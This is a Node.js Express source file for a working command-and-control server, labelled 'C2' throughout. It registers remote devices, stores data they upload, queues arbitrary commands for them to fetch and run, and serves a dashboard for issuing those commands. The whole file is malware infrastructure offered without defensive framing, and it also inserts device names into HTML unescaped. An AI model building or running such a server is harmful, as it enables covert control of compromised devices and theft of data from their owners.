const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const app = express();
app.use(express.json());

const db = new sqlite3.Database('./c2.db');
db.run(`CREATE TABLE IF NOT EXISTS devices (
  id TEXT PRIMARY KEY, name TEXT, model TEXT, last_seen TEXT, chat_id TEXT
)`);
db.run(`CREATE TABLE IF NOT EXISTS commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0
)`);
db.run(`CREATE TABLE IF NOT EXISTS data (
  id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, type TEXT, content TEXT, received_at TEXT
)`);

app.post('/api/register', (req, res) => {
  const { id, name, model, chat_id } = req.body;
  const now = new Date().toISOString();
  db.run(`INSERT OR REPLACE INTO devices (id, name, model, last_seen, chat_id) VALUES (?,?,?,?,?)`,
    [id, name, model, now, chat_id]);
  res.json({ status: 'ok' });
});

app.post('/api/upload', (req, res) => {
  const { device_id, type, content } = req.body;
  const now = new Date().toISOString();
  db.run(`INSERT INTO data (device_id, type, content, received_at) VALUES (?,?,?,?)`,
    [device_id, type, content, now]);
  db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, [now, device_id]);
  res.json({ status: 'ok' });
});

app.get('/api/commands', (req, res) => {
  const device_id = req.query.device_id;
  db.all(`SELECT command FROM commands WHERE device_id = ? AND executed = 0`, [device_id], (err, rows) => {
    if (err) return res.json([]);
    const commands = rows.map(r => r.command);
    db.run(`UPDATE commands SET executed = 1 WHERE device_id = ?`, [device_id]);
    res.json(commands);
  });
});

app.post('/api/send_command', (req, res) => {
  const { device_id, command } = req.body;
  db.run(`INSERT INTO commands (device_id, command) VALUES (?,?)`, [device_id, command]);
  res.json({ status: 'sent' });
});

app.get('/', (req, res) => {
  db.all(`SELECT * FROM devices`, (err, devices) => {
    let html = `<h1>🖥️ C2 Dashboard</h1><table border="1"><tr><th>ID</th><th>Name</th><th>Last Seen</th></tr>`;
    devices.forEach(d => html += `<tr><td>${d.id}</td><td>${d.name}</td><td>${d.last_seen}</td></tr>`);
    html += `</table><hr><form action="/api/send_command" method="POST">
      <input name="device_id" placeholder="Device ID"><input name="command" placeholder="Command">
      <button type="submit">Send</button></form>`;
    res.send(html);
  });
});

app.listen(3000, () => console.log('✅ C2 Server on port 3000'));
